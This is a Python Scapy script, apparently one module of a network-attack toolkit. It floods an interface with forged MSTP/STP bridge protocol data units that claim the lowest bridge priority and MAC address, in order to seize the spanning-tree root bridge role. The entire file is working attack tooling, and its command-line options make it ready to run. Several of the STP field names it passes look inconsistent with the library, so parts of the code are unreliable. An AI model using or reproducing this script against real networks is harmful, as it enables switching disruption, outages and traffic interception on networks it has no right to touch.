from scapy.all import Ether, Dot3, LLC, STP, sendp
import argparse
import random

def execute(args):
    """Execute MSTP attack"""
    print(f"[MSTP Attack] Starting on interface {args.interface}")
    
    try:
        packets = generate_mstp_packets(
            args.count if args.count else 20,
            args.bridge_priority if args.bridge_priority else 0,
            args.instance_id if args.instance_id else 0
        )
        
        for i, packet in enumerate(packets):
            sendp(packet, iface=args.interface, verbose=args.verbose)
            print(f"[MSTP Attack] Sent MSTP packet {i+1}/{len(packets)}")
        
        print("[MSTP Attack] Completed")
        return True
        
    except Exception as e:
        print(f"[MSTP Attack] Error: {e}")
        return False

def generate_mstp_packets(count, bridge_priority, instance_id):
    """Generate malicious MSTP packets"""
    packets = []
    
    for i in range(count):
        stp_packet = (
            Ether(dst="01:80:c2:00:00:00") /  
            Dot3() /
            LLC(dsap=0x42, ssap=0x42, ctrl=3) /
            STP(
                proto=0, 
                version=3, 
                bpdutype=0,  
                flags=0, 
                rootid=bridge_priority, 
                rootmac="00:00:00:00:00:01", 
                pathcost=0, 
                bridgeid=bridge_priority,  
                bridgemac="00:00:00:00:00:01", 
                portid=0x8001, 
                age=0, 
                maxage=20, 
                hellotime=2, 
                fwddelay=15,
                mstp_flags=0,
                cist_root_id=bridge_priority,
                cist_root_path_cost=0,
                cist_regional_root_id=bridge_priority,
                cist_port_id=0x8001,
                msti_configs=[(instance_id, bridge_priority, 0, 0, 0)]
            )
        )
        
        packets.append(stp_packet)
    
    return packets

def add_arguments(parser):
    """Add MSTP attack specific arguments to parser"""
    parser.add_argument("--bridge-priority", type=int, help="Bridge priority (lower is better)")
    parser.add_argument("--instance-id", type=int, help="MST instance ID")
    parser.add_argument("--count", "-c", type=int, default=20, 
                       help="Number of MSTP packets to send")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MSTP Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--bridge-priority", type=int, default=0, help="Bridge priority (lower is better)")
    parser.add_argument("--instance-id", type=int, default=0, help="MST instance ID")
    parser.add_argument("--count", "-c", type=int, default=20, 
                       help="Number of MSTP packets to send")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    execute(args)